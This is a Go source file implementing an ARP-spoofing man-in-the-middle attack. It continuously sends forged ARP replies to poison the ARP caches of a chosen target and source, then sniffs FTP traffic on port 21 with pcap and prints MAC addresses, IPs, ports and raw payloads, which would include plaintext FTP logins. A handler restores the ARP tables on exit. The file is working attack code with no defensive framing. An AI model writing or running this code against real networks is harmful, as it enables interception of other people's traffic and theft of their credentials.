package main

import (
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket"
	"log"
	"fmt"
	"net"
	"bytes"
	"time"
	"syscall"
	"os"
	"os/signal"
)

func HandlePacket(packet gopacket.Packet, input *InputDevices) {
	linkLayer := packet.Layer(layers.LayerTypeEthernet)
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	tcpLayer := packet.Layer(layers.LayerTypeTCP)

	if linkLayer != nil && ipLayer != nil && tcpLayer != nil {
		ethernetLayer, _ := linkLayer.(*layers.Ethernet)
		ip, _ := ipLayer.(*layers.IPv4)
		tcp, _ := tcpLayer.(*layers.TCP)
		appLayer := packet.ApplicationLayer()
	
		if ip != nil && tcp != nil && appLayer != nil {
			if (tcp.SrcPort == 21 || tcp.DstPort == 21) && (bytes.Equal(input.source.ip, ip.SrcIP) || bytes.Equal(input.source.ip, ip.DstIP)) {
				fmt.Println("Source MAC:", ethernetLayer.SrcMAC)
				fmt.Println("Destination MAC:", ethernetLayer.DstMAC)
				fmt.Println("Source IP:", ip.SrcIP)
				fmt.Println("Destination IP:", ip.DstIP)
				fmt.Println("Source Port:", tcp.SrcPort)
				fmt.Println("Destination Port:", tcp.DstPort)
				payload := appLayer.Payload()
				fmt.Println("Payload:", string(payload))
			}
		}
	}

}


func Monitor(input *InputDevices) {
	handle, err := pcap.OpenLive("eth0", 1600, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter("port 21")
	if err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	fmt.Println(" Sniffing packets ")
	for packet := range packetSource.Packets() {
		HandlePacket(packet, input)
	}
}

func GetMyMACAddress() (net.HardwareAddr, error){
	ifaces, err := net.Interfaces()
    if err != nil {
        return net.HardwareAddr{}, err
    }

    for _, iface := range ifaces {
        if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
            return iface.HardwareAddr, nil
        }
    }
	return net.HardwareAddr{}, fmt.Errorf("Local MAC address not found.")
}

func NetworkInterface(sourceMAC net.HardwareAddr) (net.Interface, error) {
	interfaces, err := net.Interfaces() 
	if err != nil {
		return net.Interface{}, err
	}
	for _, inter := range interfaces {
		if (bytes.Equal(inter.HardwareAddr, sourceMAC)) {
			return inter, nil
		}
	}
	return net.Interface{}, fmt.Errorf("Local network interface not found.")
}


func	ArpSpoof(input *InputDevices) {
	myMAC, err := GetMyMACAddress()
	if err != nil {
		log.Fatal(err)
	}
	intrface, err :=  NetworkInterface(myMAC)
	if err != nil {
		log.Fatal(err)
	}
	sll := syscall.SockaddrLinklayer{
		Ifindex: intrface.Index,
	}
	
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal(err)
	}
	defer syscall.Close(fd)

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigs
		fmt.Println("Resetting arp table...")
		for i := 0; i < 3; i++ {
			packetToTarget := CreateARPPacket(layers.ARPReply, input.target.ip, input.target.mac, myMAC, input.source.ip, input.source.mac)
			packetToSource := CreateARPPacket(layers.ARPReply, input.source.ip, input.source.mac, myMAC, input.target.ip, input.target.mac)
			SendARPPacket(fd, packetToTarget, sll)
			SendARPPacket(fd, packetToSource, sll)
			time.Sleep(2 * time.Second)
		}
		os.Exit(0)
	}()
	
	for {
		packetToTarget := CreateARPPacket(layers.ARPReply, input.target.ip, myMAC, myMAC, input.source.ip, input.source.mac)
	    packetToSource := CreateARPPacket(layers.ARPReply, input.source.ip, myMAC, myMAC, input.target.ip, input.target.mac)
	    SendARPPacket(fd, packetToTarget, sll)
		SendARPPacket(fd,  packetToSource, sll)
		time.Sleep(2 * time.Second)
	}
}


func CreateARPPacket(op uint16, spoofIP net.IP, spoofMAC net.HardwareAddr, srcMAC net.HardwareAddr, dstIP net.IP, dstMAC net.HardwareAddr) gopacket.SerializeBuffer {
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}

	ethernetLayer := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   spoofMAC,
		SourceProtAddress: spoofIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}

	if err := gopacket.SerializeLayers(buffer, opts, ethernetLayer, arpLayer); err != nil {
		log.Fatal("Error creating ARP packet:", err)
	}

	return buffer
}

func SendARPPacket(fd int, packet gopacket.SerializeBuffer, sll syscall.SockaddrLinklayer) {
	err := syscall.Sendto(fd, packet.Bytes(), 0, &sll)
	if err != nil {
		log.Fatal("Error sending ARP packet:", err)
	}
}
